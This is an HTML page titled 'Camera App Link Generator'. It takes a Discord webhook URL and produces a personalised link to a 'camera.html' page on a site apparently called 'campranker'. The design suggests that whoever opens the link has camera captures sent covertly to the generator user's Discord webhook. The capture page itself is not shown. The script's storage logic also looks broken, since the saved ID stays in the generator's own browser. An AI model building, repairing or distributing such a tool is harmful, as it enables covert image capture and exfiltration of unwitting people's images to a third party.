<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera App Generator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: white;
            text-align: center;
            padding: 20px;
        }
        input, button {
            padding: 10px;
            font-size: 16px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
            width: 80%;
            max-width: 400px;
        }
        input {
            background-color: #333;
            color: white;
        }
        button {
            background-color: #0f0;
        }
        button:hover {
            background-color: #0c0;
        }
        h1 {
            font-size: 24px;
        }
        #generatedLink {
            margin-top: 20px;
            font-size: 18px;
            color: #0f0;
            word-wrap: break-word;
        }
        #errorMessage {
            color: red;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <h1>Camera App Link Generator</h1>

    <p>Enter your Discord Webhook URL below to generate your personalized camera page link.</p>

    <input type="text" id="webhookInput" placeholder="Enter your Discord Webhook URL">
    <button id="generateButton">Generate Link</button>

    <p id="errorMessage"></p>
    <p id="generatedLink"></p>

    <script>
        const generateButton = document.getElementById('generateButton');
        const webhookInput = document.getElementById('webhookInput');
        const errorMessage = document.getElementById('errorMessage');
        const generatedLink = document.getElementById('generatedLink');

        // Function to generate a unique ID
        function generateUniqueID() {
            return 'ID' + Math.floor(Math.random() * 10000000000000).toString();
        }

        // Function to generate and store the link
        generateButton.addEventListener('click', () => {
            const webhookURL = webhookInput.value.trim();
            
            if (!webhookURL) {
                errorMessage.textContent = "Please enter a valid Discord Webhook URL!";
                return;
            }

            const userID = generateUniqueID();

            // Store the user ID and webhook URL in localStorage
            localStorage.setItem(userID, webhookURL);

            // Display the generated link for the user
            const generatedURL = `https://xxza1dxx.github.io/campranker/camera.html?userID=${userID}`;
            generatedLink.textContent = `Your unique camera link: ${generatedURL}`;

            // Clear the error message
            errorMessage.textContent = "";
        });
    </script>

</body>
</html>
